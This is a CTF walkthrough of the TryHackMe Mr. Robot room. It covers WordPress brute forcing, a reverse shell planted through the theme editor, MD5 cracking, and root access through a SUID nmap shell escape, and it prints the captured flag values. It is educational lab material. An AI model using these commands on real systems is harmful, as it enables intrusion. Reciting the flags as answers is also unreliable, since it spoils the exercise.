# Mr. Robot CTF — TryHackMe Walkthrough

![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=flat-square)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=flat-square)
![Category](https://img.shields.io/badge/Category-Web%20%7C%20Linux%20%7C%20PrivEsc-blue?style=flat-square)
![Status](https://img.shields.io/badge/Status-Completed-success?style=flat-square)

> Full walkthrough and technical write-up of the **Mr. Robot CTF** room on TryHackMe — a themed box inspired by the *Mr. Robot* TV series where the goal is to capture three hidden keys hidden behind a vulnerable WordPress instance and a Linux host.

**Author:** Leonardo Pereira Pinheiro
**GitHub:** [github.com/Leobatman](https://github.com/Leobatman)

---

## 📋 Overview

| | |
|---|---|
| **Room** | Mr. Robot CTF |
| **Platform** | TryHackMe |
| **Target OS** | Linux (Ubuntu) |
| **Objective** | Capture 3 flags (`key-1-of-3.txt`, `key-2-of-3.txt`, `key-3-of-3.txt`) |
| **Attack path** | Unauthenticated recon → WordPress credential attack → RCE via Theme Editor → local privesc via SUID binary |
| **Final privilege** | `root` |

This box simulates a real-world engagement against an outdated WordPress site backed by a Linux server, chaining several classic but still very common vulnerability classes: information disclosure, weak credentials, insecure CMS functionality, and legacy SUID binaries.

---

## 🧰 Tools Used

- **Nmap** — port scanning, service/version detection, NSE scripts (`http-enum`, `http-headers`, `vulners`)
- **Gobuster** — directory/content brute-forcing
- **WPScan** — WordPress user & credential enumeration
- **John the Ripper** — offline hash cracking
- **Netcat** — reverse shell handling
- **curl / wget** — manual endpoint and file retrieval

---

## 🔎 1. Reconnaissance

Full TCP port scan with service/version detection:

```bash
nmap -sS -p- -sV -O <target>
```

Results:

| Port | State | Service |
|------|-------|---------|
| 22/tcp | open | SSH (OpenSSH) |
| 80/tcp | open | HTTP (Apache — WordPress) |
| 443/tcp | open | HTTPS/SSL (Apache) |

Web enumeration with NSE scripts:

```bash
nmap --script http-enum,http-title,http-methods,http-headers,http-robots.txt,http-sitemap-generator <target>
```

This fingerprinted an outdated **WordPress ~4.3.1** install and surfaced several interesting paths (`/admin/`, `/wp-login.php`, `readme.html`, `/0/`, `/image/`).

---

## 🕸️ 2. Web Enumeration & Initial Disclosure

The site's front page is a themed, interactive "fsociety" terminal rather than a standard WordPress landing page, exposing custom commands (`prepare`, `fsociety`, `inform`, `question`, `wakeup`, `join`).

`robots.txt` disclosed two non-standard, unauthenticated entries:

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

Retrieved directly with no authentication required:

```bash
curl http://<target>/key-1-of-3.txt
# 073403c8a58a1f80d943455fb30724b9

wget http://<target>/fsocity.dic
```

🚩 **Key 1 of 3:** `073403c8a58a1f80d943455fb30724b9`

`fsocity.dic` is a large custom wordlist — later cleaned/deduplicated and reused for the credential attack against WordPress.

Directory brute-forcing with Gobuster confirmed the same paths and additional WordPress artifacts:

```bash
gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/big.txt -x .txt,.php
```

---

## 🔐 3. Exploitation

### 3.1 WordPress Credential Attack

A username, `elliot`, was identified during enumeration. The cleaned wordlist was used to brute-force `wp-login.php`:

```bash
wpscan --url http://<target>/wp-login.php -U elliot -P fsocity-clean.txt
```

This yielded valid administrator credentials for the WordPress dashboard.

### 3.2 Remote Code Execution via Theme Editor

With admin access, WordPress's built-in **Appearance → Editor** was used to inject a PHP reverse-shell payload into a theme template (`404.php`). Because the Theme Editor writes directly to files served by Apache, this legitimate CMS feature became a code-execution primitive.

Listener:

```bash
nc -lvnp 53
```

Requesting the modified page triggered the callback, returning a low-privileged shell running as the web server's service account (`daemon`).

---

## 🛠️ 4. Post-Exploitation

### 4.1 Local Credential Harvesting

A world-readable file exposed an MD5 hash for the local `robot` account:

```bash
cat password.raw-md5
# robot:c3fcd3d76192e4007dfb496cca67e13b
```

Cracked offline with John the Ripper against `rockyou.txt`:

```bash
john --format=raw-md5 --wordlist=rockyou.txt hash-mr-robbot.txt
# abcdefghijklmnopqrstuvwxyz  (robot)
```

Reused over SSH to obtain a stable shell as `robot`:

```bash
ssh robot@<target>
cat key-2-of-3.txt
```

🚩 **Key 2 of 3:** `822c73956184f694993bede3eb39f959`

### 4.2 Privilege Escalation to Root

Enumeration for SUID binaries revealed a legacy, locally-compiled **Nmap 3.81** binary with the SUID bit set:

```bash
find / -perm -4000 -type f 2>/dev/null | grep '/bin/'
# /usr/local/bin/nmap
```

Old Nmap releases expose an interactive mode with a shell-escape (`!sh`). Since the binary retained SUID root permissions, this spawned a root shell:

```bash
/usr/local/bin/nmap --interactive
nmap> !sh
# id
uid=0(root)
```

🚩 **Key 3 of 3:** captured after achieving root access, completing full system compromise.

---

## 🚩 Flags Summary

| Flag | Access Level | Method |
|------|--------------|--------|
| Key 1 of 3 | Unauthenticated | Disclosed via `robots.txt` |
| Key 2 of 3 | Local user `robot` | SSH after cracking MD5 password hash |
| Key 3 of 3 | `root` | Privilege escalation via SUID Nmap `--interactive` shell escape |

---

## 🧠 Key Takeaways

- **Outdated software is still the #1 root cause.** A five-year-old WordPress release with dozens of known CVEs was the entry point.
- **`robots.txt` is not access control.** It should never be relied on to "hide" sensitive files — anything referenced there is trivially discoverable.
- **CMS admin features can be RCE vectors.** The Theme/Plugin Editor should be disabled in production (`DISALLOW_FILE_EDIT` in `wp-config.php`).
- **Weak password hygiene compounds risk.** A dictionary-crackable MD5 hash turned a low-privilege web shell into a full interactive user session.
- **SUID binaries need regular auditing.** Leftover legacy tools with SUID bits (especially ones with known interactive/shell-escape features) are a classic and still very effective privesc path.

---

## ⚠️ Disclaimer

This write-up documents an exercise performed against the **Mr. Robot CTF** room on **TryHackMe**, an intentionally vulnerable machine built for legal, educational penetration-testing practice. No real-world systems were targeted. Techniques described here should only be used in authorized lab/CTF environments.

---

## 📎 Related

- Full formatted PDF/DOCX penetration test report available in this repo: [`Mr_Robot_CTF_Pentest_Report.docx`](./Mr_Robot_CTF_Pentest_Report.docx)
- Room link: [TryHackMe — Mr. Robot CTF](https://tryhackme.com/room/mrrobot)
